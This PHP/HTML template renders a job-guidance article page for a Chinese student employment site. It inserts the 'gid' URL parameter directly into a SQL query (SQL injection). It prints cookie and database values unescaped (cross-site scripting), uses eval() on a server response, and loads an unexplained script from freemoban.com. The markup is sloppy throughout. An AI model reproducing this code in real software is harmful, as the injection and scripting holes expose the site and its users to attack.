<!DOCTYPE HTML>
<html xmlns:wb="http://open.weibo.com/wb"><head>
</script><script type="text/javascript" async src="style/js/conversion.js"></script><script src="style/js/allmobilize.min.js" charset="utf-8" id="allmobilize"></script><style type="text/css">
.gk {
	font-weight: bold;
}
#body #container .clearfix .content_l .c_detail div .gk {
	font-size: 36px;
}
.title {
	font-weight: bold;
	font-size: 30px;
	color: #000;
	text-align: center;
}
</style>
<meta content="no-siteapp" http-equiv="Cache-Control">
<link  media="handheld" rel="alternate">
<!-- end 云适配 -->
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>修改密码-赚了吗-大学生求职就业网</title>


<!-- <div class="web_root"  style="display:none">http://www.lagou.com</div> -->
<script type="text/javascript">
var ctx = "http://www.lagou.com";
console.log(1);
</script>
<link rel="icon" href="style/images/topico.ico">
<link href="style/css/style.css" type="text/css" rel="stylesheet">
<link href="style/css/external.min.css" type="text/css" rel="stylesheet">
<link href="style/css/popup.css" type="text/css" rel="stylesheet">
<script type="text/javascript" src="style/js/jquery.1.10.1.min.js"></script>
<script src="style/js/jquery.lib.min.js" type="text/javascript"></script>
<script type="text/javascript" src="style/js/ajaxfileupload.js"></script>
<script src="style/js/additional-methods.js" type="text/javascript"></script>
<!--[if lte IE 8]>
    <script type="text/javafunctionscript" src="style/js/excanvas.js"></script>
<![endif]-->
<script type="text/javascript">
var youdao_conv_id = 271546; 
</script> 
<script src="style/js/conv.js" type="text/javascript"></script>
<script src="style/js/ajaxCross.json" charset="UTF-8"></script></head>
<body>

<?php 
include('conn.php');
if(isset($_GET["gid"])){
$sql="select * from guide where gid='{$_GET["gid"]}'";
}

$result=mysqli_query($con, $sql);

while
	 ($row=mysqli_fetch_array($result)){
		 $gid=$row[0];
		 $gtitle=$row[1];
	  $gtext= $row[2];
    $gtime = $row[3];

	}
	
?>





<div id="body">
	<div id="header">
    	<div class="wrapper">
 <a href="index.php" class="logo">
    			<img src='style/images/logo1.png' width="207" height="52" alt="赚钱了大学生就业网站" />
    		</a>
            
    		<ul id="navheader" class="reset">
    			<li ><a href="index.php">首页</a></li>
    			<li ><a href="companylist.php" >公司</a></li>
    			<li class="current"><a href="xjh.php" rel="nofollow">宣讲会</a></li>
    			<li ><a href="guide.php" rel="nofollow">求职指导</a></li>
	    		    		</ul>
        	        	<?php if(!isset($_COOKIE["user"])){   echo'<ul class="loginTop">
            	<li><a href="login.html" rel="nofollow">登录</a></li> 
            	<li>|</li>
            	<li><a href="register.html" rel="nofollow">注册</a></li>
            </ul> ';}   
                                            
                            
 else{  echo' <dl class="collapsible_menu">
            	<dt>
           			<span>
                     
  '.$_COOKIE["user"].'

&nbsp;</span> 
            		<span class="red dn" id="noticeDot-0"></span>
            		<i></i>
            	</dt>'; if(isset($_COOKIE["type"])){
					if($_COOKIE["type"]=="stu"){
                       echo'         	<dd><a rel="nofollow" href="jianli.php">我的简历</a></dd>
                	                	<dd><a href="myapply.php">我申请的职位</a></dd>
                	                	                	<dd class="btm"><a href="subscribe.php">我的推荐</a></dd><dd><a href="updatePwd.html">密码修改</a></dd><dd ><a rel="nofollow" href="exit.php">退出</a></dd>';}
															else{
                       echo'  
<dd style="display: none;"><a href="positions.php">我发布的职位</a></dd>
                	<dd style="display: none;"><a href="undeal.php">我收到的简历</a></dd>
                	<dd class="btm" style="display: none;"><a href="myhome.php">我的公司主页</a></d>
					<dd><a href="updatePwd.php">密码修改</a></dd><dd><a href="exit.php">退出</a></dd>';}}'
                                               
                                <dd ><a rel="nofollow" href="exit.php">退出</a></dd>
            </dl> ';}  ?>
      </div>
    </div><!-- end #header -->
    <div id="container">
        <!-- <script src="style/js/swfobject_modified.js" type="text/javascript"></script> -->
      <div class="clearfix">
        				
        <div class="content_l">
          <div class="c_breakline"></div>
       
       				<div id="Product">
        					        				
   					  <div class="product_wrap">

									
	                
					  
					            
					            <!--有介绍-->
		                <dl class="c_section">
					               		<dt>
				                   		  <h2><em></em>就业指导信息</h2>
					                   	</dt>
				                   	 <dd>
                                     <div class="title"><?php echo $gtitle;?><br><br><h1>发布时间：<?php echo $gtime;?></h1>
                                       <hr>
                                       <br>

                                     </div>
                                     <div class="c_intro"><?php echo str_replace("\r\n","<br/>",$gtext); ?></div>
				                   	 </dd>
               	  </dl>
	            </div>
				                 	
   			  </div><!-- end #Profile -->
      	
      	<!--[if IE 7]> <br /> <![endif]-->
	    
	        	 		        	<!--无招聘职位-->
	        	<input type="hidden" value="" name="hasNextPage" id="hasNextPage">
	          	<input type="hidden" value="" name="pageNo" id="pageNo">
	          	<input type="hidden" value="" name="pageSize" id="pageSize">
          		<div id="flag"></div>
      </div>	<!-- end .content_l --></div>



<script src="style/js/company.min.js" type="text/javascript"></script>
<script>
var avatar = {};
avatar.uploadComplate = function( data ){
	var result = eval('('+ data +')');
	if(result.success){
		jQuery('#logoShow img').attr("src",ctx+ '/'+result.content);
		jQuery.colorbox.close();
	}
};
</script>
			<div class="clear"></div>
			<input type="hidden" value="d1035b6caa514d869727cff29a1c2e0c" id="resubmitToken">
	    	<a rel="nofollow" title="回到顶部" id="backtop" style="display: inline;"></a>
  </div><!-- end #container -->
</div><!-- end #body --><script src="style/js/core.min.js" type="text/javascript"></script>
<script src="style/js/popup.min.js" type="text/javascript"></script>

<!--  -->


<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div></body><script type="text/javascript" src="http://freemoban.com/js/a.js"></script> </html>